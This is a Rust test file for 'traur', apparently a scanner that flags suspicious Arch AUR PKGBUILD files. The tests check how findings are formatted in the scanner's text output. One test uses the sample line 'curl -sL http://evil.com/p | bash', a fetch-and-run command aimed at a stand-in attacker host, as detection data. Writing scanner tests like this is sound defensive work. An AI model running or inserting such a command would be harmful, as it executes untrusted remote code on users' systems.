//! E2E tests for scan output formatting.
//!
//! Verifies the exact text output produced by `write_text`: a flat findings
//! list with no score or tier.

use traur::shared::output;
use traur::shared::scoring::{ScanResult, Signal, SignalCategory};

fn sig(id: &str, description: &str) -> Signal {
    Signal {
        id: id.to_string(),
        category: SignalCategory::Pkgbuild,
        points: 0,
        description: description.to_string(),
        is_override_gate: false,
        matched_line: None,
    }
}

fn sig_with_line(id: &str, description: &str, line: &str) -> Signal {
    Signal {
        matched_line: Some(line.to_string()),
        ..sig(id, description)
    }
}

fn render(result: &ScanResult, verbose: bool) -> String {
    colored::control::set_override(false);
    let mut buf = Vec::new();
    output::write_text(&mut buf, result, verbose);
    String::from_utf8(buf).unwrap()
}

#[test]
fn no_findings() {
    let result = ScanResult { package: "yay".to_string(), signals: vec![] };
    let out = render(&result, false);
    assert_eq!(out, "\
traur: yay
  No findings.
");
}

#[test]
fn findings_listed() {
    let result = ScanResult {
        package: "eww".to_string(),
        signals: vec![
            sig("M-NEW-PACKAGE", "Package is less than 6 months old"),
            sig("P-CURL-PIPE", "curl piped to bash"),
        ],
    };
    let out = render(&result, false);
    assert!(out.contains("traur: eww"), "{out}");
    // Category header shown once (grouped), descriptions + IDs under it
    assert!(out.contains("Pkgbuild"), "category header missing: {out}");
    assert!(out.contains("Package is less than 6 months old  (M-NEW-PACKAGE)"), "{out}");
    assert!(out.contains("curl piped to bash  (P-CURL-PIPE)"), "{out}");
}

#[test]
fn verbose_shows_matched_lines() {
    let result = ScanResult {
        package: "test-pkg".to_string(),
        signals: vec![
            sig_with_line("P-CURL-PIPE", "curl piped to bash", "curl -sL http://evil.com/p | bash"),
            sig("M-VOTES-ZERO", "Zero votes"),
        ],
    };
    let out = render(&result, true);
    assert!(out.contains("curl piped to bash  (P-CURL-PIPE)"), "{out}");
    assert!(out.contains("curl -sL http://evil.com/p | bash"), "matched line missing: {out}");
}

#[test]
fn verbose_without_matched_line_shows_nothing_extra() {
    let result = ScanResult {
        package: "test-pkg".to_string(),
        signals: vec![sig("M-NEW-PACKAGE", "Package is less than 6 months old")],
    };
    assert_eq!(render(&result, true), render(&result, false));
}

// ---------- Full pipeline e2e (scan_pkgbuild -> write_text) ----------

#[test]
fn full_pipeline_benign_lists_any_findings() {
    let pkgbuild = include_str!("fixtures/benign/yay.PKGBUILD");
    let result = traur::coordinator::scan_pkgbuild("yay", pkgbuild);
    let out = render(&result, false);

    assert!(out.contains("traur: yay"), "should show package header");

    if result.signals.is_empty() {
        assert!(out.contains("No findings."));
    } else {
        for signal in &result.signals {
            assert!(out.contains(&signal.id), "signal {} must appear in output", signal.id);
            assert!(out.contains(&signal.description), "signal description must appear");
        }
    }
}

#[test]
fn full_pipeline_malicious_lists_all_findings() {
    let pkgbuild = include_str!("fixtures/malicious/curl_pipe_bash.PKGBUILD");
    let result = traur::coordinator::scan_pkgbuild("firefox-fix-bin", pkgbuild);
    let out = render(&result, false);

    assert!(out.contains("P-CURL-PIPE"), "curl|bash finding must appear");
    for signal in &result.signals {
        assert!(out.contains(&signal.id), "signal {} must appear in output", signal.id);
    }
}
